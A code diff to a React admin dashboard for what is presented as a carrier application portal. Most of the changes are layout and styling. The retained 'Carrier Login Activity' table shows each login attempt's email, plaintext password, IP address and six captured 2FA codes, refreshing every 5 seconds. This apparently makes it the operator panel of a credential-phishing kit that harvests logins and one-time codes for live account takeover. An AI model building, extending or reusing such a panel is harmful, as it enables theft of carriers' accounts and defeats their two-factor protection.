@@ -126,20 +126,28 @@ function Admin() {
     setSelected(null)
   }
 
+  const formatTime = (value) => {
+    if (!value) return '—'
+    const date = new Date(value)
+    return Number.isNaN(date.getTime()) ? value : date.toLocaleString()
+  }
+
   if (!adminKey) {
     return (
-      <div className="form-page">
-        <div className="form-card">
-          <h1>Admin Login</h1>
-          <p className="muted">Enter your admin email and password to access the carrier dashboard.</p>
+      <div className="form-page admin-login-page">
+        <div className="form-card admin-login-card">
+          <h1>Admin Dashboard</h1>
+          <p className="muted">Sign in with your admin username and password to review carrier applications and login activity.</p>
           <form onSubmit={handleLoginSubmit}>
             <div className="form-field">
-              <label htmlFor="adminEmail">Email</label>
+              <label htmlFor="adminUsername">Username</label>
               <input
-                id="adminEmail"
+                id="adminUsername"
                 type="text"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
+                autoComplete="username"
+                placeholder="Remy"
                 required
               />
             </div>
@@ -150,6 +158,7 @@ function Admin() {
                 type="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
+                autoComplete="current-password"
                 required
               />
             </div>
@@ -179,86 +188,100 @@ function Admin() {
         </div>
       )}
 
-      <div className="portal-header">
-        <h1>Carrier Applications</h1>
+      <div className="portal-header admin-page-header">
+        <div>
+          <h1>Carrier Applications</h1>
+          <p className="admin-page-subtitle">{carriers.length} total sign-ups</p>
+        </div>
         <button className="btn btn-outline-dark btn-sm" onClick={handleLogout}>
           Log Out
         </button>
       </div>
 
-      <table className="admin-table">
-        <thead>
-          <tr>
-            <th>Company</th>
-            <th>Contact</th>
-            <th>Email</th>
-            <th>Phone</th>
-            <th>Status</th>
-          </tr>
-        </thead>
-        <tbody>
-          {carriers.map((c) => (
-            <tr key={c.id} onClick={() => setSelected(c)}>
-              <td>{c.company_legal_name}</td>
-              <td>{c.contact_name}</td>
-              <td>{c.email}</td>
-              <td>{c.phone}</td>
-              <td><span className={`status-badge status-${c.status}`}>{c.status}</span></td>
+      <div className="admin-table-wrap">
+        <table className="admin-table">
+          <thead>
+            <tr>
+              <th>Company</th>
+              <th>Contact</th>
+              <th>Email</th>
+              <th>Phone</th>
+              <th>Status</th>
             </tr>
-          ))}
-          {carriers.length === 0 && (
-            <tr><td colSpan={5}>No carrier applications yet.</td></tr>
-          )}
-        </tbody>
-      </table>
-
-      <div className="portal-header" style={{ marginTop: 40 }}>
-        <h1>Carrier Login Activity</h1>
+          </thead>
+          <tbody>
+            {carriers.map((c) => (
+              <tr
+                key={c.id}
+                className={selected?.id === c.id ? 'row-selected' : ''}
+                onClick={() => setSelected(c)}
+              >
+                <td>{c.company_legal_name}</td>
+                <td>{c.contact_name}</td>
+                <td>{c.email}</td>
+                <td>{c.phone}</td>
+                <td><span className={`status-badge status-${c.status}`}>{c.status}</span></td>
+              </tr>
+            ))}
+            {carriers.length === 0 && (
+              <tr><td colSpan={5}>No carrier applications yet.</td></tr>
+            )}
+          </tbody>
+        </table>
       </div>
 
-      <table className="admin-table">
-        <thead>
-          <tr>
-            <th>Time</th>
-            <th>Email</th>
-            <th>Password</th>
-            <th>IP Address</th>
-            <th>Carrier</th>
-            <th>2FA Code 1</th>
-            <th>2FA Code 2</th>
-            <th>2FA Code 3</th>
-            <th>2FA Code 4</th>
-            <th>2FA Code 5</th>
-            <th>2FA Code 6</th>
-            <th>Result</th>
-          </tr>
-        </thead>
-        <tbody>
-          {loginActivity.map((a) => (
-            <tr key={a.id} className={newIds.has(a.id) ? 'row-new-attempt' : ''}>
-              <td>{a.created_at}</td>
-              <td>{a.email}</td>
-              <td>{a.password || '—'}</td>
-              <td>{a.ip_address || '—'}</td>
-              <td>{a.company_legal_name || '—'}</td>
-              <td>{a.twofa_code_1 || '—'}</td>
-              <td>{a.twofa_code_2 || '—'}</td>
-              <td>{a.twofa_code_3 || '—'}</td>
-              <td>{a.twofa_code_4 || '—'}</td>
-              <td>{a.twofa_code_5 || '—'}</td>
-              <td>{a.twofa_code_6 || '—'}</td>
-              <td>
-                <span className={`status-badge ${a.success ? 'status-approved' : 'status-rejected'}`}>
-                  {a.success ? 'Success' : 'Failed'}
-                </span>
-              </td>
+      <div className="portal-header admin-page-header admin-section-header">
+        <div>
+          <h1>Carrier Login Activity</h1>
+          <p className="admin-page-subtitle">Updates every 5 seconds</p>
+        </div>
+      </div>
+
+      <div className="admin-table-wrap admin-table-wrap-wide">
+        <table className="admin-table admin-table-compact">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Email</th>
+              <th>Password</th>
+              <th>IP Address</th>
+              <th>Carrier</th>
+              <th>2FA 1</th>
+              <th>2FA 2</th>
+              <th>2FA 3</th>
+              <th>2FA 4</th>
+              <th>2FA 5</th>
+              <th>2FA 6</th>
+              <th>Result</th>
             </tr>
-          ))}
-          {loginActivity.length === 0 && (
-            <tr><td colSpan={9}>No login activity yet.</td></tr>
-          )}
-        </tbody>
-      </table>
+          </thead>
+          <tbody>
+            {loginActivity.map((a) => (
+              <tr key={a.id} className={newIds.has(a.id) ? 'row-new-attempt' : ''}>
+                <td>{formatTime(a.created_at)}</td>
+                <td>{a.email}</td>
+                <td>{a.password || '—'}</td>
+                <td>{a.ip_address || '—'}</td>
+                <td>{a.company_legal_name || '—'}</td>
+                <td>{a.twofa_code_1 || '—'}</td>
+                <td>{a.twofa_code_2 || '—'}</td>
+                <td>{a.twofa_code_3 || '—'}</td>
+                <td>{a.twofa_code_4 || '—'}</td>
+                <td>{a.twofa_code_5 || '—'}</td>
+                <td>{a.twofa_code_6 || '—'}</td>
+                <td>
+                  <span className={`status-badge ${a.success ? 'status-approved' : 'status-rejected'}`}>
+                    {a.success ? 'Success' : 'Failed'}
+                  </span>
+                </td>
+              </tr>
+            ))}
+            {loginActivity.length === 0 && (
+              <tr><td colSpan={12}>No login activity yet.</td></tr>
+            )}
+          </tbody>
+        </table>
+      </div>
 
       {selected && (
         <div className="form-card" style={{ marginTop: 24 }}>
